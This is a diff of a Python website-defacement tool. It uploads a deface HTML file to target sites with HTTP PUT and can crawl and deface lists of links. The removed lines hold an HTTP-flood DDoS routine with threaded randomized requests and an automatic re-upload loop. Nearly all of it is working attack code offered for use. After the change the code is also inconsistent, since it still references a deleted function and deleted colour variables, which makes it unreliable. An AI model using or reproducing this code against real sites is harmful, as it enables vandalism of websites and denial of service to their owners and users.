@@ -1,17 +1,11 @@
-# -*- coding: utf-8 -*-
-
-import requests
-import os.path
-import urllib.request
+import time
 import threading
 import random
 import os
 import sys
+import requests
 from urllib.parse import urlparse
 from bs4 import BeautifulSoup
-import time
-
-interval_ms = 1
 
 try:
     import requests
@@ -63,11 +57,6 @@ banner = """
 
 """
 
-b = '\033[31m'
-h = '\033[32m'
-m = '\033[00m'
-
-
 def x(tetew):
     ipt = input(tetew)
     return str(ipt)
@@ -83,18 +72,9 @@ def aox(script, target_url):
         if req.status_code > 200 or req.status_code >= 250:
             print(m + ">" + b + "[-] FAILED" + b + " %s/%s" % (site, script))
         else:
-            print(m + ">" + h + "[+] ONLINE" + h + " %s/%s" % (site, script))
+            print(m + ">" + h + "[+] UPLOADED" + h + " %s/%s" % (site, script))
     except requests.exceptions.RequestException:
         print(m + ">" + b + "[-] FAILED" + b + " %s" % target_url)
-
-def find_links(html_content):
-    soup = BeautifulSoup(html_content, 'html.parser')
-    links = []
-    for link in soup.find_all('a'):
-        href = link.get('href')
-        if href:
-            links.append(href)
-    return links
 
 def crawl_and_deface(site_url, deface_file):
     try:
@@ -127,24 +107,6 @@ def crawl_and_deface_links_from_file(deface_file, links_file):
     for link in links:
         aox(deface_file, link)
 
-def main(__bn__):
-    print(__bn__)
-    while True:
-        try:
-            choice = x("Choose an option:\n1. Deface a single site\n2. Crawl and deface links from a file\n3. DDoS\n4. Quit\n")
-            if choice == "1":
-                deface_single_site()
-            elif choice == "2":
-                crawl_and_deface_links()
-            elif choice == "3":
-                ddos()
-            elif choice == "4":
-                exit()
-            else:
-                print("Invalid option, please try again.")
-        except KeyboardInterrupt:
-            print("\nOperation cancelled.")
-
 def deface_single_site():
     try:
         a = x(f"Enter your deface .html file: ")
@@ -152,7 +114,7 @@ def deface_single_site():
             print("File '%s' not found" % a)
             return
         target_url = x(f"Enter the target site URL: ")
-        auto_upload_deface(a, target_url, interval_ms)
+        aox(a, target_url)
     except KeyboardInterrupt:
         print()
 
@@ -167,97 +129,24 @@ def crawl_and_deface_links():
     except KeyboardInterrupt:
         print()
 
-def ddos():
-    try:
-        os.system("clear" if sys.platform == "linux" or sys.platform == "linux2" else "cls")
-
-        print("\033[1;32m")
-        url = input("          URL: ").strip()
-        print("\033[1;m")
-
-        count = 0
-
-        def useragent():
-            headers = []
-            headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
-            headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
-            headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
-            headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
-            return headers
-
-        def ascii(size):
-            out_str = ''
-
-            for e in range(0, size):
-                code = random.randint(65, 90)
-                out_str += chr(code)
-            return out_str
-
-        class httpth1(threading.Thread):
-            def run(self):
-                nonlocal count
-                while True:
-                    try:
-                        req = urllib.request.Request(url + "?" + ascii(random.randint(3, 10)))
-                        req.add_header("User-Agent", random.choice(useragent()))
-                        req.add_header("Referer", random.choice(referer))
-                        urllib.request.urlopen(req)
-                        count += 1
-                        print("{0} Pure Dos Send".format(count))
-                    except urllib.error.HTTPError:
-                        print("\033[1;34m SERVER MIGHT BE DOWN \033[1;m")
-                        pass
-                    except urllib.error.URLError:
-                        print("\033[1;34m URLERROR \033[1;m")
-                        sys.exit()
-                    except ValueError:
-                        print("\033[1;34m [-]Check Your URL \033[1;m")
-                        sys.exit()
-                    except KeyboardInterrupt:
-                        exit("\033[1;34m [-]Canceled By User \033[1;m")
-                        sys.exit()
-
-        while True:
-            try:
-                th1 = httpth1()
-                th1.start()
-            except Exception:
-                pass
-            except KeyboardInterrupt:
-                exit("\033[1;34m [-]Canceled By User \033[1;m")
-
-    except KeyboardInterrupt:
-        print("\nExiting DDoS...")
-
-def auto_upload_deface(script, target_url, interval_ms):
+def main(__bn__):
+    print(__bn__)
     while True:
-        auto_upload(script, target_url)
-        time.sleep(interval_ms / 100)  # Convert interval to seconds
-
-def auto_upload(script, target_url):
-    try:
-        a = script
-        if not os.path.isfile(a):
-            print("File '%s' not found" % a)
-            return
-        target_url = target_url
-        op = open(a, "r").read()
-        s = requests.Session()
         try:
-            site = target_url.strip()
-            if not site.startswith("http://"):
-                site = "http://" + site
-            req = s.put(site + "/" + a, data=op)
-            if req.status_code > 200 or req.status_code >= 250:
-                print(m + ">" + b + "[-] FAILED" + b + " %s/%s" % (site, a))
+            choice = x("Choose an option:\n1. Deface a single site\n2. Crawl and deface links from a file\n3. Quit\n")
+            if choice == "1":
+                deface_single_site()
+            elif choice == "2":
+                crawl_and_deface_links()
+            elif choice == "3":
+                exit()
             else:
-                print(m + ">" + h + "[+] ONLINE" + h + " %s/%s" % (site, a))
-        except requests.exceptions.RequestException:
-            print(m + ">" + b + "[-] FAILED" + b + " %s" % target_url)
+                print("Invalid option, please try again.")
+        except KeyboardInterrupt:
+            print("\nOperation cancelled.")
 
-    except KeyboardInterrupt:
-        print()
-        
 if __name__ == "__main__":
     banner = banner.replace("[⍟]", "[AUTO⍟]")
+    links = ["http://ex1.com", "http://ex2.com", "http://ex3.com"]  # List of links to upload to
+    auto_upload_thread = threading.Thread(target=auto_upload_deface, args=("your_deface_file.html", links, 1))  # Auto upload every 1 ms
     main(banner)
